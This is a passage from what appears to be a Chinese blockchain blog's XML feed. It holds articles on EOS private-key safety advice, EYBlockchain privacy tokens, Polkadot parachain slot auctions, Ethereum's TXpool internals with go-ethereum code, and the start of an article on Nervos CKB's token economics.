助记词是私钥的另外一种表现形式，由于私钥随机产生，识记较为困难，为了更好地记忆复杂的私钥，用户可以使用助记词，通过助记词导入钱包。如果用户使用空助记词或是强度较弱的助记词产生的秘钥，很容易遭受“彩虹”攻击。 使用不安全的第三方私钥创建工具 用户使用不安全的第三方私钥创建工具，例如安全保护不够强的钱包，连网在线创建私钥的网站等。 私钥使用时： 使用了不安全的 EOS 超级节点投票工具 使用了不安全的 EOS 超级节点投票工具，使得工具开发者(实为攻击者)可窃取EOS 私钥。 用户存储私钥的媒介不安全 用户存储私钥的方式不安全，例如存储在邮箱、备忘录等，可能存在弱口令被攻击者登录，从而被窃取私钥。 在复制粘贴私钥时，被恶意软件窃取 用户在手机或电脑上复制粘贴私钥时，被某些恶意软件监听，导致被窃取。 防范措施 针对私钥安全防范，我们给出以下建议： 使用安全性有保证的映射工具、私钥创建工具和超级节点投票工具。 切忌让陌生人帮自己注册账号。若不得以需要让他人帮忙注册，一定要使用受信任的进程或接口。在注册好后，对Owner和Active私钥做仔细检查，以防万一。 务必备份好Owner 助记词、Active 助记词。特别注意，不管是Owner 助记词，还是Active 助记词，都需要按顺序记下并保护好。一旦有人得到了你的助记词, 那就等同于掌控了你的钱包，不需要任何密码就可以转移你的资产。 不管是私钥还是助记词最好抄写在一张纸上，不要截屏或记录在手机上，也不要通过任何渠道将助记词信息传播给他人（比如截图等等），这是非常危险的行为。 避免在使用时进行私钥的复制、粘贴 不要随意点开来源不明的链接，下载来源不明的文件。 引用及资料数据来源： 小牛币读 《史上最全交易所被盗事件大盘点》 IMOS 《EOS被盗事件频起，这里有一份安全攻略供你食用》 ITleaks《近千万EOS被盗事件回顾，大家请保护好自己的EOS私钥》 本文来自 深入浅出区块链社区合作伙伴：专注于区块链生态安全的Beosin 成都链安 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博 掌握区块链技术动态。]]></content>
      <categories>
        <category>区块链安全</category>
      </categories>
      <tags>
        <tag>私钥</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用 EYBlockchain 在以太坊上创建隐私币]]></title>
    <url>%2F2019%2F06%2F13%2FEYBlockchain%2F</url>
    <content type="text"><![CDATA[前一段时间，介绍了几篇零知识证明文章：入门zkSNARK， 从 QSP 到 QAP，Groth16 算法介绍， 今天这篇文章分享下利用 EYBlockchain 在以太坊上创建隐私币。 EYBlockchain 简介EYBlockchain是在以太坊的基础上，提供隐私交易的能力。EYBlockchain目前的实现并不是传统意义上的链，并没有修改以太坊的代码。而是在ZoKrates（以太坊上 zkSNARKs 的工具箱）的基础上，利用以太坊上的智能合约，提供了以太坊上的比较完整的隐私交易的服务。在以太坊智能合约中，隐私交易的管理类似Zcash。 EYBlockchain的源代码为Nightfall, 白皮书在这里 。 白皮书 对EYBlockchain的愿景以及实现细节解释的比较清楚。 EYBlockchain在ZoKrates的DSL(Domain Specific Language)的基础上，提供了更人性化一些的语法。ZoKrates 使用DSL语言，也就是.code文件描述R1CS（门电路）。EYBlockchain 使用.pcode文件，先预处理成.code文件。EYBlockchain针对门电路预处理的代码zokrates-preprocessor。 整体框架 EYBlockchain的核心模块是offchain和ZKP。offchain又分为两个功能模块：whisper提供了p2p通讯的能力，pkd（public key directory）存储了公钥。公钥包括两部分：1. whisper本身的公钥 2. 隐私交易的公钥（地址）。简单的说，offchain模块维护了线下的公钥，并提供了相互查询的功能。 ZKP是隐私交易的核心模块，在ZoKrates的基础上，实现零知识证明的证明和验证服务。EYBlockchain还提供了account模块，实现以太坊地址的生成。非链上的数据都存储在database模块中（目前用MangoDB实现）。 EYBlockchain采用的零知识证明的算法是GM17，也就是在2017年发表的Groth16的增强版本。 EYBlockchain 源代码结构EYBlockchain的源代码目录结构如下： 主要包含了一下几个部分： API-Gateway：API调用接口。 accounts：以太坊账户地址创建。 database：数据存储，用MangoDB数据库实现。 offchain：实现whisper以及公钥的管理。 zkp：隐私交易的核心逻辑，主要是零知识证明和验证的服务。 ui：示例UI。 初始设置在隐私代币生成和流通之前，必须进行初始设置。初始化设置包括两部分： 零知识证明的证明密钥/验证密钥对； 以太坊上部署智能合约。 注意，零知识证明的证明密钥和验证密钥对，必须由可信机制生成。 零知识证明的证明密钥/验证密钥对EYBlockchain的隐私操作目前包括3个：隐私代币生成，转账和销毁。EYBlockchain目前支持ERC20/ERC721两种代币，所以目前总共有6种操作：ft-mint, ft-transfer, ft-burn, nft-mint, nft-transfer, nft-burn 。 注： ft 表示 Fungible Tokens, nft 表示：Non-Fungible Tokens 在生成证明密钥/验证密钥之后，在每个操作目录下会生成几个文件： nft-mint-vk.json - 验证密钥的json文件 verification.key - 验证密钥的原始数据 proving.key - 证明密钥 xxx-mint.pcode - pcode描述的门电路 verifier.sol - ZoKrates生成的零知识验证智能合约。目前已经废弃。所有的零知识验证，通过统一的GM17.sol完成。 以太坊智能合约部署在以太坊上部署如下的智能合约： FToken - EY发行的ERC20的代币合约，EY OPs Coin，简称OPS。FTokenShield - ERC20对应的隐私交易合约，管理所有隐私交易信息。NFToken - EY发行的ERC721的代币合约，EYToken，简称EYT。NFTokenShield - ERC721对应的隐私交易合约，管理所有隐私交易信息。GM17 - 零知识验证智能合约。Verifier Registry - 提供两个功能：1. 所有零知识验证的验证密钥注册 2. 所有证明信息的存储。 在向Verifier Registry注册一个验证密钥后，智能合约会返回一个验证密钥编号（vkId）。 以下以ERC20为例，说明隐私交易的生成/转账/销毁逻辑。注意的是，隐私交易涉及的智能合约的交易计算量都比较大，目前代码中建议使用6500000的Gas油费。 隐私代币生成（Mint）隐私代币生成的过程，就是从非隐私的OPS代币，到隐私代币的过程。注意的是，mint的过程本身并不是隐私的，发起账户和金额都是公开的。 Step1 - 通过ft-mint的vkId，生成证明。公开信息为转账金额和（c，pk，r）三元组生成的hash值。私有信息为pk和r。r为随机数。 Step2 - 调用FTokenShield智能合约的mint接口，提交proof/公开信息以及vkId。 Step3/4 - 调用GM17以及Verifier Registry存储和验证proof。 Step5 - 在验证proof后，调用FToken智能合约，从发起者账户转账到FTokenShield。 值得一提的是，（c，pk，r）三元组生成的hash值，在FTokenShield会被组织成merkle树。hash值，也称为commitment，作为merkle树的叶子节点。 隐私代币转账（Transfer）转账的模型，类似UTXO模型。从两个属于同一个账户的隐私交易中（交易金额分别是c和d），生成两个隐私交易：其中一个属于转账对象的（交易金额为e），另外一个（余额为f）返回转账发起账户。其中，c+d=e+f。 Step1 - 通过ft-transfer的vkId，生成证明。生成e和f的commitment，c和d的nullifier。 Step2 - 调用FTokenShield智能合约的transfer接口，提交proof/公开信息以及vkId。 Step3/4 - 调用GM17以及Verifier Registry存储和验证proof。 Step5 - 通过whisper告知转账对象：转账金额e，随机数r1，z1以及在merkle树上的叶子的index。 隐私代币销毁（Burn）隐私代币的销毁，就是将代币从隐私账户转回普通账户的过程。 Step1 - 通过ft-burn的vkId，生成证明。 Step2 - 调用FTokenShield智能合约的burn接口，提交proof/公开信息以及vkId。 Step3/4 - 调用GM17以及Verifier Registry存储和验证proof。 Step5 - 在验证proof后，调用FToken智能合约，从FTokenShield转账到发起者账户。 简单的说，就是在证明拥有某个commitment中pk指定的sk的情况下，可以生成nullifier。在隐私智能合约中销毁隐私代币后，可以将资产恢复到普通账户。 UI部分EYBlockchain还提供了已有功能的简单UI，方便开发人员验证功能。UI的界面如下图： 很清楚分为四个部分：EYT（ERC721），EYT对应的隐私代币，OPS（ERC20），OPS对应的隐私代币。 总结：EYBlockchain运行在以太坊上，在ZoKrates零知识证明的基础上，利用以太坊上的智能合约提供隐私交易的能力。在智能合约中，隐私交易的管理类似Zcash。目前，EYBlockchain在以太坊上发行两种代币：EYT（ERC721）和OPS（ERC20），并针对这两种代币提供隐私交易的能力。 本文作者 Star Li，他的公众号星想法有很多原创高质量文章，欢迎大家扫码关注。 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博 掌握区块链技术动态。]]></content>
      <categories>
        <category>基础理论</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>EYBlockchain</tag>
        <tag>零知识证明</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[波卡平行链的插槽设计]]></title>
    <url>%2F2019%2F06%2F04%2Fpolkadot-parachain-slots%2F</url>
    <content type="text"><![CDATA[本文翻译自链接，文章虽然是讲平行链的设计，同时也深入阐述了波卡的经济体系设计，以及为什么项目会愿意参与波卡生态，共享用户。 随着波卡主网即将上线，Web3 基金会收到越来越多关于平行链的问题：初始分配、如何成为一条平行链等等。本文会对平行链的设计草案进行解释，包括在如何在启动时做到公平分配，以及将来插槽数量如何增长。 我们之前发布过一个波卡上的项目文档，现在我们希望能够获得更多愿意参与平行链的开发团队和社区成员的反馈。 平行链租赁机制仍在演进中，以下只是目前最新的进展而非最终版本： 1、在链初始启动时，插槽数量较少，但会随着时间增加2、我们会通过拍卖的方式出租插槽，拍卖的方式是 Candle Auction3、每次出租的插槽的生命周期是有限的4、小部分插槽会由Web3基金会保留一部分时间，给“common good”的平行链 注：理解 Candle Auction 可以点击链接。 Parachains 平行链是什么Parachains 属于构成波卡的外部系统。一个区块链有两种方式与波卡交互：通过原生的平行链，或者通过中继链。 部署原生的平行链，可以借助 Cumulus （一个Substrate的插件）。原生的平行链可以调用更快速的跨链消息机制，并与波卡共享安全性。共享安全性的好处是可以避免通过增发来激励社区进行抵押挖矿，而同样能够获得很好的安全性。 但是如果该链有一些历史遗留的设计导致其无法完全使用波卡的底层框架，它可以保留自己的共识和最终性机制，通过平行链上的中继成为一个中继链。中继链与波卡通信时，中继链的状态必须已经在自己的链上被敲定，然后才能给波卡传输消息。很可能大量区块链会通过平行链的中继接入波卡，从而为平行链的插槽均摊成本。 各种潜在的平行链通过 Relay 链进行连接 为什么平行链的数量是有限的平行链需要资源来保证安全的运行。平行链的数量有限因为波卡网络的资源是有限的。这和其他链引入手续费或者其他资源来限制计算资源使用异曲同工。目前在第一版波卡网络上有多少平行链还未最终确定。波卡白皮书中有提到，第一版波卡网络的性能还是有极大受限于新增插槽带来的消息队列次方级开销增长。项目需要抵押 DOT 来获得平行链插槽，因此将无意义的平行链，接入的成本是很高的。 平行链的推出计划随着优化的进行，平行链的数量将从初期的5，在1到2年内逐步增长到50至200之间。 具体的推出顺序：1、保证 Relay 链的安全2、优先让最有价值的项目加入3、平衡平行链的供需关系，使得验证人有足够的经济激励4、为更多实验性需求提供拓展性 创世平行链波卡网络启动最初应该不会有大量平行链的存在，所以在启动初期插槽将由 Web3 基金会根据下面的条件来确定： 1、具有通用价值，比如中继链、智能合约链等2、Web3 基金会会进行与 on-chain 相同逻辑的 off-chain 拍卖，运行团队来租用插槽，抵押最多 DOT 的团队将获得该插槽 通用价值链的类型包括：1、以太坊中继2、比特币中继3、Edgeware，wasm的智能合约平台4、其它关键基础设施，比如去中心化交易所或稳定币 更详细的方式可以查看 Polkadot Wiki 平行链竞拍机制竞拍会持续进行，从而满足需要的项目都有机会参与。当插槽需求增加时，波卡网络会通过链上治理来增加新插槽，反之亦然。Candle-auction 将能够保证竞拍的安全性，因为没人能够知道竞拍的结束时间。 参与竞拍的项目包括希望目前的平行链希望延长租期，以及新的项目希望部署平行链。将来，平行链的账户可以直接通过智能合约参与竞拍，也就是说平行链社区可以通过众筹的形式共同来保证能够续租插槽，并从中获得收益。 获得平行链插槽的步骤参与竞拍并非购买，只需抵押固定期限的DOT即可，本质上只是付出了通胀可能带来贬值的机会成本。当平行链插槽释放时，竞拍时抵押的DOT就可以获得返还。 出租周期被划分为【每6个月】，所有插槽的出租期同时开始和结束。每次拍卖会包含4个出租周期，即2年时间。需要租的项目可以根据自己的需要，自由的对这4个出租周期进行出价。竞拍系统的机制是以两年为标准，最大化DOT的抵押数量。（具体逻辑本文不展开，有兴趣的读者可以参考英文原文） 参与竞拍所有竞拍通过 DOT 进行。项目可以通过下面的方式获得 DOT： 1、创建自己的平行链通证，并通过市场交换获得 DOT2、从市场上购买 DOT3、众筹募集 DOT4、向 Web3 基金会申请 多个项目也可以通过共享一个插槽的方式均摊成本。 平行链的成本从 DOT 通证消耗的角度看，平行链是没有成本的。对于需要购买 DOT 来获得插槽的项目来说，成本来自于持有 DOT 而非其他加密资产的机会成本。一个成功的平行链首先必须给整个波卡网络增加有用功能，而跨链所能带来的网络效应则将超线性的放大该平行链的价值和用户基数。所以成功的平行链应该会通过持有更多的DOT来保证长期的成功。 在波卡网络里，有4个地方需要DOT：治理、平行链租赁、转账、Staking抵押。抵押在平行链插槽租赁的DOT，将无法用于其他三个场景（治理有可能可以）。 波卡创始启动时，因为10%的年增发，Staking奖励的年化将达到20%。（以太坊启动初期的增发是30%每年，因为波卡的 BABE/GRANDPA 共识的消耗比以太坊的PoW低得多）。当然基于风险偏好、领域知识、人工成本、Staking系统效率、DOT价格，20%只是理论最大值，实际上的机会成本会小得多。根据我们的初步模型，我们估计实际的平行链成本在 10-20万美金一年，在初期可能更小。 相比之下，Cosmos/Tezos/EOS 的成本是上千万美元一年，以太坊和比特币的成本是几十亿美元。因此在波卡上获取同样的安全性的成本比其它链小3到5个量级，而且还能够进行革命性的快速、无限制、无需信任的跨链消息传输。 目前市值排名前300的加密通证的市值都已经超过1000万美元，基本上每天的交易量都超过10万美元。假设它们通过相对保守的2%年增发用于挖矿、Staking等费用，这意味这它们几乎都需要每年花费20万美元来保证安全。因此如果租赁波卡的平行链插槽，它们能够获得更高的性价比。 当然成为波卡网络的平行链所需付出的成本也是存在的。随着网络扩容，更多的平行链插槽、更多的中继会进一步降低成本。总的来说，波卡共享安全性的模式会比通过自行组建节点的方式成本更低。 治理波卡并不存在明确的机制来限制或者移除平行链，波卡本身是一个通过链上治理可不断升级的区块链。争议和危害可能存在，但他需要获得各种利益相关的同意，其难度非常之高。在区块链的语境里，治理是本小说，而波卡不可避免的是一场非常前沿的实验。 有缺陷的平行链（死循环、内存爆炸、垃圾消息）将会被验证人发现并禁止。这些离开波卡网络的平行链需要自行维护它的共识安全性。 本文作者：CANAAN ， 他的微信： yiheweixin2014 原文首发于：http://boka.network 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>跨链</category>
        <category>Polkadot</category>
      </categories>
      <tags>
        <tag>Polkadot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[以太坊交易流程及交易池 TXpool 分析]]></title>
    <url>%2F2019%2F06%2F03%2Feth-txpool%2F</url>
    <content type="text"><![CDATA[这篇文章来看看以太坊的交易流程及交易池TXpool。 以太坊交易流程用户通过 Json RPC 向以太坊网络发送的交易请求最后都会被 go-ethereum/internal/ethapi/api.go 的SendTransaction 函数所接收。 从接收用户传入的参数，到把交易放入交易池等待广播的流程如下图所示： 整个流程从SendTransaction接收到SendTxArgs开始, SendTxArgs的结构如下； 12345678910type SendTxArgs struct &#123; From common.Address `json:"from"` To *common.Address `json:"to"` Gas *hexutil.Uint64 `json:"gas"` GasPrice *hexutil.Big `json:"gasPrice"` Value *hexutil.Big `json:"value"` Nonce *hexutil.Uint64 `json:"nonce"` Data *hexutil.Bytes `json:"data"` Input *hexutil.Bytes `json:"input"`&#125; SendTransaction首先需要根据From字段来找到当前的账户，为签名交易做准备。 接着开始对交易进行预处理，为SendTxArgs的一些空字段设置默认值，比如分配Nonce，根据To字段是否为空，来判断交易是部署合约还是发送交易等。 进行预处理之后，需要对交易进行RLP编码，再根据之前获得的账户私钥进行签名。 最后在把交易提交到TXpool。 交易序列化交易的序列化是通过 toTransaction 这个函数来完成的。 序列化的时候根据To字段是否为nil来判断是将交易序列化成交易，还是创建合约。 调用SendTranstion接口的Data和Input字段，最终都会被赋值给Input，再被序列化成Payload放入交易池（TXpool）中，现在保留Data字主要是为了向前兼容，目前推荐用Input字段。 当部署合约的时候Input是合约的代码，当发送交易的时候Input是交易的内容 123456789101112func (args *SendTxArgs) toTransaction() *types.Transaction &#123; var input []byte if args.Data != nil &#123; input = *args.Data &#125; else if args.Input != nil &#123; input = *args.Input &#125; if args.To == nil &#123; return types.NewContractCreation(uint64(*args.Nonce), (*big.Int)(args.Value), uint64(*args.Gas), (*big.Int)(args.GasPrice), input) &#125; return types.NewTransaction(uint64(*args.Nonce), *args.To, (*big.Int)(args.Value), uint64(*args.Gas), (*big.Int)(args.GasPrice), input)&#125; 最终序列化后的交易包含以下字段，需要注意的是不包含From字段，把交易和发送者解耦以后可以支持域名地址，提供了更多的可能性。 12345678910111213141516type txdata struct &#123; AccountNonce uint64 `json:"nonce" gencodec:"required"` Price *big.Int `json:"gasPrice" gencodec:"required"` GasLimit uint64 `json:"gas" gencodec:"required"` Recipient *common.Address `json:"to" rlp:"nil"` // nil means contract creation Amount *big.Int `json:"value" gencodec:"required"` Payload []byte `json:"input" gencodec:"required"` // Signature values V *big.Int `json:"v" gencodec:"required"` R *big.Int `json:"r" gencodec:"required"` S *big.Int `json:"s" gencodec:"required"` // This is only used when marshaling to JSON. Hash *common.Hash `json:"hash" rlp:"-"`&#125; r,s,v是交易签名后的值，它们可以被用来生成签名者的公钥；R，S是ECDSA椭圆加密算法的输出值，V是用于恢复结果的ID 用户私钥签名序列化的交易以后就会被放入到交易池中。 交易池无论是本节点创建的交易(local)还是其他节点广播过来的交易(remote)，都会缓存在TXpool中，当需要生成区块时，就从TXpool中选择合适的交易打包成块，经由共识最终确认。 TXpool的核心功能 缓存交易 在打包区块前，对交易进行验证 过滤无效交易 惩罚恶意发送大量交易的账户 TXpool的核心结构如下图； TXpool最为核心的结构是两个Map: queued和pending，用来存未验证的交易和验证过的交易。 添加交易添加交易到TXpool的过程比较简单，总体流程是这样的； 验证交易的有效性 - 判断交易的price是否大于缓存中最小的，如果小于就拒收，如果大于就删除最小的交易，把本次交易插入pending 如果这个nonce已经存在，依然是按照price的大小进行替换 如果交易有效，不能替换pending里面的任何交易，则添加到queued中 清理交易池TXpool存在内存中，不可能无限大，等超过一定阈值就需要对交易池里面的交易进行清理。 pending的缓冲区容量默认是 4096，queued的缓冲区容量默认是1024 清理交易分为清理queued和清理pending，清理顺序queued-&gt;pending-&gt;queued 当满足以下条件的时候就会清理queued 当nonce小于当前账号发送noce的最小值，也就是说之前的交易已经全部上链 当前的nonce符合条件可以移动到pending队列中，先从queued清除，然后移动（send）到pending中 账户余额不足以支持该交易的花费了 - 交易数量超过了缓冲区 清理queued会影响pending的大小，所以queued清理优先级高 清理pending时，首先把超过每个账户可执行交易数量(AccountSlots)的数量，按照从大到小记录下来，接着按照从多到少删除。 举个例子来说明剔除的规则； 假如AccountSlots为4 有四个超出的账户，它们的数量分别是10， 9， 7，5第一次剔除 [10], 剔除结束 [10]第二次剔除 [10, 9] 剔除结束 [9，9]第三次剔除 [9, 9, 7] 剔除结束 [7, 7, 7]第四次剔除 [7, 7 , 7 ,5] 剔除结束 [5，5，5，5]这个时候如果还是超出限制，则继续剔除第五次剔除 [5, 5 , 5 ,5] 剔除结束 [4，4，4，4] 接着清理ququed，规则也很简单，越先进入queued的越后删除，直到清理到满足最大队列长度（GlobalQueue）为止。 重构交易池(reset)到这一步还有一个问题没有解决，以太坊是分布式系统，当本地节点已经挑选出最优的交易，准备广播给整个网络，这个时候矿工已经打包了一个区块，本地节点的区块头就是旧的了，本地筛选的交易有可能已经被打包，如果已经被打包生成了新区块，再将这个交易广播已经没有任何的意义，甚至我们费尽心思准备好的pending缓冲区里的交易都是无效的。 为了避免上面的情况发生，我们就需要监听链是否有新区块产生，也就是ChainHeadEvent事件。 当监听到ChainHeadEvent事件时候，我们又该如何调整queued和pending呢？ 首先需要将已经分叉的链回退到同一个区块号上(blockNumebr)，有可能是本地节点领先，有可能是网络上其他节点领先，但无论怎样，都回退到同一个区块号。 本地节点回退时，撤销的交易保存到discarded切片中，网络上其他节点的撤销交易保存在included切片中。 当区块号一致的时候，还需要进一步的比较区块的Hash来进一步确认区块里面的交易是否一致，如果不一致一致回退到区块Hash为止，回退撤销的交易依旧保存在discarded和included切片中。 等完全确认本地和网络的链没有分叉的时候，就需要比较discarded和included里面的交易，因为网络上区块的生成优先级高于本地，所以需要剔除discarded中inclueded的交易，生成reinject切片，剔除完以后还需要对TXpool按照网络新生成区块的信息设置世界状态等信息，设置完以后，重新将reinject加入TXpool，加入以后在进行验证清理等流程。 思考 以太坊在实现TXpool的时候为了保证数据的一致性使用大量的锁，性能一般。 当区块生成速度比较快的时候需要频繁的reset，导致TXpool需要占用比较多的资源。 是否有比较好的方法既可以保证数据的一致性又可以快速找到相同的根区块？ 本文作者是深入浅出区块链共建者清源，欢迎关注清源的博客，不定期分享一些区块链底层技术文章。备注：编者在原文上略有修改。 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>基础理论</category>
      </categories>
      <tags>
        <tag>以太坊</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nervos CKB 加密经济模型]]></title>
    <url>%2F2019%2F06%2F02%2Fnervos-ckb%2F</url>
    <content type="text"><![CDATA[Nervos CKB 加密经济模型是我到目前为止见到的比较有特色的经济模型设计。感觉不只是公链，对任何协议层的经济模型设计都有一定的借鉴意义。 代币经济学的设计目标公有非许可链是开放给所有人自由参与的分布式系统。一个精心设计的加密经济模型，可以将各方参与者的利益与协议的整体利益对齐, 使其在追求自身经济利益的同时也能对整个区块链网络做出贡献。 更具体地说，加密经济系统的设计必须回答以下问题： 经济模型如何保障协议的安全性？ 经济模式如何维护协议的可持续性？ 经济模型如何将不同参与者的经济目标与提高整个网络价值的目标对齐? 比特币的加密经济模型比特币协议使用原生代币激励矿工验证交易和挖矿。中本聪(Satoshi Nakamoto)共识遵循最长链原则，以此激励矿工在挖出新块后立即广播，在收到新块后立即验证，以达成全网共识。 比特币的原生代币既是功能代币，也是储值资产。当比特币作为功能代币时，可用于支付交易费用，当作为储值资产时，可用来保存价值。通常我们用术语 MoE (Medium of Exchange, 交易媒介) 和 SoV (Store of Value, 价值存储) 分别指代这两种用例。两者并不冲突，它们对比特币网络的正常运行都发挥着重要的作用。然而，研究这两种用例背后不同的经济动机，对分析比特币网络的可持续性具有重要的指导意义。 比特币协议中对区块大小的限制制约了整个网络的交易处理能力，因此用户需要通过类似拍卖的机制竞争有限的交易处理资源。拍卖价格也就是交易费由实际的交易需求决定，当交易需求增加时，为了击败竞拍对手，交易费的价格也会水涨船高。 比特币作为交易媒介网络MoE 用户将比特币网络看作一个点对点的价值传输网络，他们不通过持有比特币获益，而是利用比特币网络的点对点交易功能受益。事实上，已经有专业的比特币支付服务商提供这种资金流动性服务，用户不需要持有加密货币也可以将比特币作为价值载体完成交易。MoE 用户并不关心加密货币的价格和价格波动，他们只关心交易费用换算成法币后的价格。 比特币要成为一个 MoE 主导的网络是很有挑战性的。如果协议限制了出块时间和区块大小，那么网络的交易处理能力会非常受限，因此网络的繁荣必然会导致交易成本增加，而这将反过来降低比特币网络与其他类似的区块链协议甚至是与比特币分叉链之间的竞争力。如果协议致力于维持较低的交易成本，通过设置更快的出块时间或更大的区块大小来提高交易处理能力，这会导致更频繁的分叉或者更高的参与共识成本，实际上这相当于在去中心化与安全性上做了妥协。 比特币作为价值存储的网络而 SoV 用户则将比特币网络看作一种为原生代币提供安全保障的协议，他们相信原生代币可以长期保值，而 MoE 是一种不可或缺的功能。SoV 用户，特别是长期持币者，并不在乎交易成本，因为交易成本会随着持有时间的累积被分摊。SoV 用户关注的是比特币本身的价值，而这依赖于网络的安全性和去中心化程度 - 如果网络变得不够安全、易受攻击，那么价值将无法被储存，比特币也将一文不值; 如果网络算力过于集中，比特币作为一种资产不再具有独立价值，并将面临保管方风险。 如果比特币要成为一个 SoV 主导的网络，其必须继续坚持当前的货币政策，维护网络的安全性以及保持一定程度的去中心化。然而，比特币的发行总量有限，当所有的比特币被开采一空后，给矿工的激励只剩下交易费。这种模式是否可持续仍然是一个问号，特别是在一个 SoV 主导的网络里往往不会产生许多交易。 谁能长期补贴矿工？安全性和去中心化是区块链网络的两个基本属性，维护这两个属性需要付出很高的成本，因此支付给网络维护者(主要是矿工)的奖励必须能够覆盖这些成本。根据比特币当前的模型，当代币开采完毕后，如果矿工仍可赚取足够的交易费，那么比特币网络依然保有安全性。 然而，MoE 用户需要承受网络安全风险的时间非常有限，因此他们不愿意为此付费。而虽然 SoV 用户愿意支付高额交易费，因为他们暴露于网络安全风险的时间更长，但问题是他们很久才产生一次交易。 比特币的共识机制激励矿工去识别并验证最长的链以当作全网的最新状态。矿工持续投入的算力不只为最新的区块提供了安全性，也维护了之前所有区块的不可篡改性。仅靠 SoV 用户的一次性付款让矿工持续提供安全保障非长久之策。 而在 SoV 网络中，如果依靠通胀来为网络安全提供资金对矿工的激励更持久，对用户也更友好。基于通胀的区块奖励暗含用户间接地向安全提供者支付费用，并且费用多少与其享受安全服务的时间成正比。 可保值和交易的智能合约平台像以太坊这样的智能合约平台具有图灵完备的可编程性，可以支持更多的应用场景。原生代币通常用于为去中心化的计算服务定价和费用支付。与比特币网络一样，智能合约平台也具有资产保值和交易媒介的双重功能。它们与纯支付网络的不同之处在于，它们保存的价值不仅仅是它们自己的原生代币，还包括去中心化应用的内部状态，例如在 ERC20 智能合约里的加密资产。 另一个与支付网络的重大区别是智能合约平台上的交易更加「便携」。利用智能合约平台更高级的脚本优势来开发交互协议，能够更容易的将交易转移到更具成本效益的「交易为主」子链上，并安全地将数据安置回「纪录为主」主链。 智能合约平台的经济模型面临着类似支付网络的两极化趋势 - 由于其良好的交互能力，智能合约平台要么偏向「交易平台」,要么偏向「保值平台」。在经济上，这种分歧源自这样的事实：这两种「平台」具有不同的系统资源利用方式，处理交易消耗的计算和带宽是瞬时的，而且这两种资源是可再生的，但是保值却需要长期占用全球共识状态。所以，为其中一个方向而设计优化的经济模型不太可能适用于另一个方向。 有竞争力的交易平台需要优先考虑降低交易成本。MoE 用户可以接受不太理想的安全性，因为他们只在有限的时间内暴露在危险之中。他们可以接受交易审查的可能性，大不了去其他地方进行交易。致力于提高安全性或抗审查性的交易平台将付出更高的交易成本，这将导致更高的交易费或者在”stake for access”模型中付出更高的资金成本，这都会使得这个交易网络的竞争力下降 尤其是在设计良好的跨链协议可以允许无信任的状态转移与抗交易作恶时，这样的状况就更明显。我们已经可以看到很多的例子反映了 MoE 用户会优先考虑低成本的手续费而不是更高的安全性，他们往往选择在中心化的交易所和没那么去中心化的区块链上交易。而由于交易效率的原因，尽管它们缺点重重但仍然很受欢迎。 但是，有竞争力的保值平台需要具有可持续的安全性和抗审查性。因此需要设计一种不是基于即时交易而是基于对世界状态的占用而设计的经济模型，并且让用户为网络基础设施的关键资源的消耗付费。 资产存储智能合约平台最重要的用例之一是发行代币来代表资产的所有权。这些加密资产可以拥有自己的社区和市场，其价值与平台代币的价值是独立的。在另一方面，这些资产依赖于平台来处理交易并提供安全性。像比特币这样的支付网络可以被视为单一资产平台，而智能合约平台则是多资产平台。与比特币背景下的「价值存储（SoV）」概念类似，我们称智能合约平台的功能是可以保留其加密资产「资产存储（SoA）」的价值。 以保存资产为重点的智能合约平台，必须具有「资产存储」的代币经济设计。平台安全级别必须与平台上加密资产的价值一起增长。否则随着平台上加密资产价值的增长，因为攻击的利益也会增长，平台本身遭到「双花攻击」的可能性会大大增加。 目前的智能合约平台都不是为了「资产存储」平台而设计的。这些平台的代币经济学旨在促进交易（例如，以太坊的原生代币用于支付去中心化计算的费用）或满足权益证明的要求。在任何一种情况下，资产价值的增长并不一定会提高矿工的收入，而事实是只有确保矿工的持续高收入才能激励矿工持续投入，从而使得平台获得更多的安全保障。 每个多资产平台都是独立的生态系统。平台的安全性可被视为有益于所有项目的「公用物品」。为了从安全的角度使得生态系统可持续发展，必须有一个明确的机制，即该平台需要能够捕捉到平台上生态系统的成功，以同时提高其自身的安全级别。换句话说，「资产存储」平台必须能将对加密资产的需求转化为其矿工的收入，通常是通过提高对矿工的补偿，让其获得额外的原生代币。 否则，平台的安全级别会成为加密资产价值的上限。当资产价值上升，平台不再能够充分保护在平台上典型的交易时，流动性就会枯竭，对资产的需求也会减少。 去中心化的多资产智能合约平台必须持续的做好「资产存储」的功能。 去中心化与状态限制的需求与其他长期价值存储的系统一样，「资产存储」平台必须保持中立，并且确保没有审查和充公的风险。这些条件使得黄金成为世界上数千年来最受欢迎的价值存储。对于完全开放无须许可的区块链网络，抗审查的能力主要来自于最广泛的全球共识，并且让全节点参与的门槛足够的低。与支付网络相比，智能合约平台运行全节点需要更密集的资源，因此，「资产存储」平台必须采取措施来保持全节点的运营成本，以保持网络有足够的去中心化。 比特币和以太坊都限制了交易吞吐量以确保参与方不仅只有「超级计算机」 - 比特币限制带宽，以太网限制计算能力。然而，他们没有采取有效的方式，来容纳共识参与和交易验证所需的不断增长的全局状态。尤其是整个智能合约平台有着高度集中的需求，全局状态的增长速度只会更快 在比特币中，全局状态是 UTXO 的集合。比特币不会直接控制 UTXO 大小的增长，但每个新增的 UTXO 都会增加交易费用，使交易成本变得更高。 在以太坊中，全局状态由 EVM 的状态树来表示，该状态是包含所有帐户的余额和内部状态的数据结构。创建新帐户或新的智能合约值时，全局状态的大小就会增加。以太坊收取固定的 Gas 费用用于存入新的数据，并在移除数据时提供固定数量的 Gas 作为交易退款。以太坊的方法是朝着正确方向迈出的一步，但仍有几个问题： 全局状态的增长不受任何限制，并且可以无限增长，因此全节点的参与成本并不确定 该系统为扩大状态存储提高了一次性收费，但矿工和全节点必须承担长期存储费用 没有充分的理由说明为什么扩展存储的成本应该以固定数量的 Gas 定价（Gas 用于计算一个单位的计算费用） 「一次性支付，永远占用」的状态存储模型的激励很小，很难让用户自愿清除状态并减少全局状态的占用 以太坊社区正在积极解决这个问题，主要的解决方案是收取智能合约的「状态租金」 - 